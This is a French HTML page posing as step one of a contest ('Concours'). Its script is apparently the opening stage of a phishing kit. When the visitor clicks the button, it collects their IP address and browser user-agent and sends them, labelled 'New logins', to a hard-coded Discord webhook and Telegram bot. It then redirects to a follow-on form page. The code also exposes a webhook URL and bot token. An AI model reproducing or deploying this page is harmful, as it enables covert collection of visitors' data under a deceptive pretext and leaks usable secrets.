<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<title>Concours - √âtape 1</title>
<style>
  body {
    background: #2c014d;
    color: #fff;
    font-family: sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .c {
    background: rgba(44,1,77,0.85);
    padding: 30px;
    border-radius: 20px;
    width: 360px;
    text-align: center;
    box-shadow: 0 0 15px #9b00ff;
    border: 2px solid #a54ffb;
  }
  button {
    width: 100%;
    margin: 8px 0;
    padding: 12px;
    border: 2px solid #a54ffb;
    border-radius: 10px;
    background: #f7b500;
    color: #2c014d;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 0 10px #f7b500;
    transition: 0.3s;
  }
  button:hover {
    background: #e0a600;
    box-shadow: 0 0 20px #ffcb3c;
  }
  #msg {
    color: #f88;
    margin-top: 15px;
  }
</style>
</head>
<body>
<div class="c">
  <h1>√âtape 1 : Ouverture de la page</h1>
  <button id="sendBtn">Envoyer infos & Continuer</button>
  <div id="msg"></div>
</div>

<script>
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
  const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
  const TELEGRAM_CHAT_ID = "-1002810249796";

  async function getIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip || "IP inconnue";
    } catch {
      return "IP inconnue";
    }
  }

  async function sendDiscord(embed) {
    return fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] }),
    });
  }

  async function sendTelegram(text) {
    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "Markdown",
        disable_web_page_preview: true,
      }),
    });
  }

  document.getElementById("sendBtn").addEventListener("click", async () => {
    const msgEl = document.getElementById("msg");
    msgEl.style.color = "#f88";
    msgEl.textContent = "Envoi en cours...";

    const ip = await getIP();
    const ua = navigator.userAgent || "Inconnu";

    const discordEmbed = {
      title: "[üåê] New logins [üåê]",
      color: 0x9B00FF,
      fields: [
        { name: "üåê Adresse IP", value: ip, inline: false },
        { name: "üåê User-Agent", value: ua, inline: false },
      ],
      timestamp: new Date().toISOString(),
    };

    const telegramText =
      `[üåê] New logins [üåê]\n\n` +
      `üåê Adresse IP : ${ip}\n` +
      `üåê User-Agent : ${ua}`;

    try {
      await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
      localStorage.setItem("step1", JSON.stringify({ ip, ua }));
      msgEl.style.color = "#0f0";
      msgEl.textContent = "Envoy√© ! Redirection...";
      setTimeout(() => (window.location.href = "formulaire.html"), 1200);
    } catch {
      msgEl.textContent = "Erreur lors de l'envoi, r√©essayez.";
    }
  });
</script>
</body>
</html>
